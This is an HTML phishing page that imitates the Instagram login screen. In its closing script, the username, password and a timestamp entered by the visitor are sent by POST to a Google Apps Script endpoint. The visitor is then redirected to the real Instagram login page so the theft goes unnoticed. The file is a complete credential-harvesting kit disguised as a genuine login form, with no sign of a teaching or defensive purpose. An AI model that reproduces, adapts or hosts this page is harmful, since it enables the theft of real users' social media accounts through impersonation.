<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login . Instagram</title>

  <!-- Instagram-like font -->
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
    }
    .container {
      width: 350px;
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      text-align: center;
      margin-bottom: 10px;
    }
    .logo {
      font-family: 'Grand Hotel', cursive;
      font-size: 48px;
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background: #fafafa;
    }
    button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background: #0095f6;
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background: #0077c2;
    }
    .or {
      display: flex;
      align-items: center;
      margin: 20px 0;
      color: #8e8e8e;
      font-size: 12px;
      font-weight: bold;
    }
    .or div {
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }
    .or span {
      margin: 0 10px;
    }
    .facebook-login {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      color: #385185;
      font-weight: bold;
      font-size: 14px;
      margin-bottom: 15px;
      cursor: pointer;
    }
    .facebook-login img {
      width: 18px;
      height: 18px;
    }
    .forgot {
      font-size: 12px;
      color: #00376b;
      text-decoration: none;
    }
    .signup {
      width: 350px;
      background: white;
      border: 1px solid #dbdbdb;
      text-align: center;
      padding: 20px;
      font-size: 14px;
    }
    .signup a {
      color: #0095f6;
      font-weight: bold;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <!-- Login Box -->
  <div class="container">
    <div class="logo">Instagram</div>

    <form id="loginForm">
      <input type="text" id="username" placeholder="Phone number, username, or email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>

    <div class="or">
      <div></div>
      <span>OR</span>
      <div></div>
    </div>

    <div class="facebook-login">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
      <span>Log in with Facebook</span>
    </div>

    <a href="#" class="forgot">Forgot password?</a>
  </div>

  <div class="signup">
    Donâ€™t have an account? <a href="#">Sign up</a>
  </div>

  <script>
    const form = document.getElementById("loginForm");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const timestamp = new Date().toLocaleString(); // client timestamp

      try {
        await fetch("https://script.google.com/macros/s/AKfycbzqy5N2TvY8xWYbsfS7AiRfHp_cbrXsgyLuaFfSDkP4oxAmduJZQzcAq9kII_CJfMJkcw/exec", {
          method: "POST",
          body: JSON.stringify({ username, password, timestamp }),
        });
      } catch (error) {
        console.error("Error:", error);
      }

      // Redirect user to the real Instagram login page
      window.location.href = "https://www.instagram.com/accounts/login/";
    });
  </script>

</body>
</html>
